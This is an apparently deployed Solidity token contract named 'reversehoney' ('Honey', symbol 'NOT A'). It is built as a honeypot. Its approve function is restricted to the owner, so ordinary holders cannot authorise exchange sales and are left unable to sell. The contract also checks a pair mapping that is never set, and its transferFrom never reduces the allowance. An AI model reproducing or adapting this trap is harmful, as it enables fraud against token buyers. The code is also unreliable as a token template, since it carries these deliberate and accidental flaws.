/**
 *Submitted for verification at Etherscan.io on 2021-10-11
*/

pragma solidity ^0.8.4;
// SPDX-License-Identifier: Unlicensed

contract Ownable {

  address public owner;

  modifier onlyOwner {
    require(msg.sender == owner);
    _;
  }

  constructor () public {
    owner = msg.sender;
  }
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract reversehoney is Ownable {
    mapping(address => uint) public balances;
    mapping(address=> mapping(address => uint)) public allowance;
    mapping (address => bool) private uniswapV2Pair;
    uint public totalSupply = 1000 * 10**1;
    string public name = "Honey";
    string public symbol = "NOT A";
    uint public decimals = 1;

    event Transfer(address indexed from, address indexed to, uint value);
    
    event Approval(address indexed owner, address indexed spender, uint256 value);


    constructor() {
        balances[msg.sender] = totalSupply;
    }

    function balanceOf(address owner) public view returns(uint) {
        return balances[owner];
    }
    
    function transfer(address to, uint value) public returns(bool){
        require(balanceOf(msg.sender) >= value, 'balance too low' );
        balances[to] += value;
        balances[msg.sender] -= value;
        emit Transfer(msg.sender, to, value);
        return true;
    }
    
    function transferFrom(address from, address to, uint value) public returns(bool){
        require(balanceOf(from) >= value, 'balance too low' );
        require(allowance[from][msg.sender] >= value, 'allowance too low');
        require(!uniswapV2Pair[from]);
        balances[to] += value;
        balances[from] -= value;
        emit Transfer(from, to, value);
        return true;
        
    }
    
    function approve(address spender, uint256 value) public onlyOwner returns(bool success){
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }
    
    }